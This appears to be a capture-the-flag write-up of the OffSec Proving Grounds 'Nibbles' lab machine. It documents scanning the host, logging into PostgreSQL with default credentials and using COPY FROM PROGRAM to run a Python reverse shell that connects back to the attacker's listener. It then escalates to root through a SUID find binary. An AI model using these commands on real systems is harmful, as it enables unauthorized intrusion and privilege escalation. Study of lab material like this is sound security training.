---
layout: post
title: "OffSec Proving Grounds: Nibbles"
categories: provinggrounds
author:
  - spaceyowie
---

## Nibbles

> This machine will highlight why we have hardening guidelines.

## Nmap

```shell
# Nmap 7.91 scan initiated Fri Apr 23 21:35:53 2021 as: nmap -sS -A -p 1-65535 -v -oA Nibbles 192.168.137.47
Nmap scan report for 192.168.137.47
Host is up (0.22s latency).
Not shown: 65529 filtered ports
PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Enter a title, displayed at the top of the window.
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-27T15:41:47
| Not valid after:  2030-04-25T15:41:47
| MD5:   b086 6d30 4913 684e 16c1 8348 fc76 fe43
|_SHA-1: cb30 5109 0fc1 14ab 0fb9 8e55 5874 4bb5 ba57 66af
|_ssl-date: TLS randomness does not represent time
Aggressive OS guesses: Linux 2.6.32 (88%), Linux 2.6.32 or 3.10 (88%), Linux 2.6.39 (88%), Linux 3.10 - 3.12 (88%), Linux 3.4 (88%), Linux 3.5 (88%), Linux 4.2 (88%), Linux 4.4 (88%), Synology DiskStation Manager 5.1 (88%), WatchGuard Fireware 11.8 (88%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 41.184 days (since Sat Mar 13 18:15:22 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   217.38 ms 192.168.49.1
2   217.39 ms 192.168.137.47

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 23 21:40:22 2021 -- 1 IP address (1 host up) scanned in 269.14 seconds```

The initial nmap scan reveals a few services that might give us a way in: FTP, HTTP, PostgreSQL. Initial thoughts:

1. FTP - are there any public exploits for vsftpd 3.0.3? Even though nmap didn't report it, can we connect anonymously? Or perhaps try default creds...
2. HTTP - run the usual scanners (gobuster, dirb, Nikto) while manually browsing the website. At this point, we want to look for interesting assets/forms/links, and try to identify what software's running the website.
3. PostgreSQL - similar to FTP, are there any public exploits? And can we connect with default creds?

## Port 21 - FTP

Assuming nmap reported the correct version of vsftpd, a brief search on exploit-db for vsftpd 3.0.3 gives a DoS script but this won't be useful.

It also appears that the target doesn't allow anonymous connections. It's too early to start brute forcing so we'll keep this as an option for later.

```shell
┌──(spaceyowie@0x1e)-[~/pg/Nibbles]
└─$ ftp 192.168.160.47       
Connected to 192.168.160.47.
220 (vsFTPd 3.0.3)
Name (192.168.160.47:spaceyowie): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.```

## Port 80 - HTTP

Moving on to port 80, let gobuster, dirb, and Nikto run in the background while we take a look around the website. As we can see, it's very basic with no real functionality to exploit.

![](/assets/2021-04-27-offsec-proving-grounds-nibbles-writeup-web1.png)

![](/assets/2021-04-27-offsec-proving-grounds-nibbles-writeup-web2.png)

Checking the page source doesn't reveal any juicy details, and unfortunately none of the scanners found anything, either.

```shell
┌──(spaceyowie@0x1e)-[~/pg/Nibbles]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 5 -u http://192.168.137.47
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.137.47
[+] Threads:        5
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/04/23 21:38:14 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2021/04/23 21:41:39 Finished
===============================================================```

```shell
┌──(spaceyowie@0x1e)-[~/pg/Nibbles]
└─$ dirb http://192.168.137.47

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Apr 23 21:41:57 2021
URL_BASE: http://192.168.137.47/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.137.47/ ----
+ http://192.168.137.47/index.html (CODE:200|SIZE:1272)                                                                
+ http://192.168.137.47/server-status (CODE:403|SIZE:279)                                                              
                                                                                                                       
-----------------
END_TIME: Fri Apr 23 21:59:00 2021
DOWNLOADED: 4612 - FOUND: 2```

```shell
┌──(spaceyowie@0x1e)-[~/pg/Nibbles]
└─$ nikto -o nikto.txt -Format txt -host 192.168.137.47        
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.137.47
+ Target Hostname:    192.168.137.47
+ Target Port:        80
+ Start Time:         2021-04-23 21:37:22 (GMT10)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 4f8, size: 5a34020bc5080, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2021-04-23 22:07:36 (GMT10) (1814 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested```

## Port 5437 - PostgreSQL

After striking out with FTP and HTTP, it's time to have a crack at PostgreSQL. We haven't found any creds yet so we'll have to start by trying some defaults, like *postgres*:*postgres* or *postgres*:*password*.

```shell
┌──(spaceyowie@0x1e)-[~/pg/Nibbles]
└─$ psql -h 192.168.160.47 -p 5437 -U postgres                                                  
Password for user postgres: postgres
psql (13.2 (Debian 13.2-1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#```

And we're in! Now let's have a look around the db and enumerate what we can.

```shell
postgres=# SELECT Version();
													version                                                     
----------------------------------------------------------------------------------------------------------------
 PostgreSQL 11.7 (Debian 11.7-0+deb10u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit
(1 row)

postgres=# \l
								  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-----------+----------+----------+-------------+-------------+-----------------------
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
		   |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
		   |          |          |             |             | postgres=CTc/postgres
(3 rows)

postgres=# \du
								   List of roles
 Role name |                         Attributes                         | Member of 
-----------+------------------------------------------------------------+-----------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}

postgres=# \dt
Did not find any relations.

postgres=# SELECT usename, passwd FROM pg_shadow;
 usename  |               passwd                
----------+-------------------------------------
 postgres | md53175bce1d3201d16594cebf9d7eb3f9d
(1 row)```

Looks kind of empty, no additional creds or interesting data. Let's try reading /etc/passwd and /etc/shadow from the host.

```shell
postgres=# select pg_read_file('/etc/passwd', 0, 200000);
									   pg_read_file                                        
-------------------------------------------------------------------------------------------
 root:x:0:0:root:/root:/bin/bash                                                          +
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                          +
 bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                     +
 sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                     +
 sync:x:4:65534:sync:/bin:/bin/sync                                                       +
...snip...
 sshd:x:105:65534::/run/sshd:/usr/sbin/nologin                                            +
 wilson:x:1000:1000:wilson,,,:/home/wilson:/bin/bash                                      +
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin                       +
 postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash             +
 Debian-snmp:x:107:114::/var/lib/snmp:/bin/false                                          +
 ftp:x:108:117:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin                                   +
 
(1 row)

postgres=# select pg_read_file('/etc/shadow', 0, 200000);
ERROR:  could not open file "/etc/shadow" for reading: Permission denied```

It would've been nice to get some hashes, maybe there's some goodies in Wilson's home dir instead.

```shell
postgres=# select pg_ls_dir('/home/wilson');
   pg_ls_dir   
---------------
 .bash_logout
 .gnupg
 .bash_history
 .profile
 local.txt
 .bashrc
 ftp
(7 rows)

postgres=# select pg_read_file('/home/wilson/local.txt', 0, 200000);
		   pg_read_file           
----------------------------------
 83b4e223d796d4e0df0c595e58ace9e6+
 
(1 row)```

And there's the user flag, can we do the same with root?

```shell
postgres=# select pg_ls_dir('/root');
ERROR:  could not open directory "/root": Permission denied```

:(

## Foothold

Since we have some capability to read/write files to the host, we're in a good position to focus on getting a low priv shell. After a bit of Googling, there appear to be two good choices for this version of PostgreSQL:
1. A UDF hack, similar to the MySQL raptor_udf2 hack - see [Pentester Academy "PostgreSQL UDF Command Execution"](https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed) or [HackTricks "RCE with PostgreSQL Extensions"](https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions).
2. COPY FROM PROGRAM arbitrary command execution - see [Greenwolf's blog post](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5).

The second option is the simplest so let's give it a go. In PostgreSQL, we'll want to:
1. Create a new table
2. Use the COPY FROM PROGRAM function to execute 'id' and store the output in the new table
3. Check the records in the table to verify it worked

```shell
postgres=# CREATE TABLE foo (bar text);
CREATE TABLE

postgres=# COPY foo FROM PROGRAM 'id';
COPY 1

postgres=# SELECT * FROM foo;
                                  bar                                   
------------------------------------------------------------------------
 uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
(1 row)```

That works as expected. And if we do it again but instead send a [Python reverse shell one-liner](https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell), and nothing's blocking outbound traffic, it should connect to our netcat listener.

```shell
┌──(spaceyowie@0x1e)-[~/pg/Nibbles]
└─$ sudo nc -lnvp 80
[sudo] password for spaceyowie: 
listening on [any] 80 ...```

```shell
postgres=# CREATE TABLE foo (bar text);
CREATE TABLE

postgres=# COPY hax FROM PROGRAM 'python -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.160",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);''';```

```shell
┌──(spaceyowie@0x1e)-[~/pg/Nibbles]
└─$ sudo nc -lnvp 80
listening on [any] 80 ...
connect to [192.168.49.160] from (UNKNOWN) [192.168.160.47] 57510
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
$ python -c 'import pty; pty.spawn("/bin/bash");'
postgres@nibbles:/var/lib/postgresql/11/main$ ```

## Privesc

- [x] Low priv shell
- [ ] Privesc

Now we've got a low priv shell on the target, we can enumerate the system to find a path to privilege escalation. A quick check of the usual suspects reveals an interesting binary with the suid bit set:

```shell
postgres@nibbles:/var/lib/postgresql/11/main$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
...snip...
/usr/bin/find```

The `find` command has an `-exec` argument that will execute a specified command, and with the suid bit set, the command will also be executed with root privileges. This gives us the ability to not only read the root flag, but also manipulate config files or create new users.

```shell
postgres@nibbles:/var/lib/postgresql/11/main$ find PG_VERSION -exec cat /root/proof.txt \;
find PG_VERSION -exec cat /root/proof.txt \;
fd8334ae00d76615d69931c449c61301```

And there's the root flag :D

## Rooted

- [x] Low priv shell
- [x] Privesc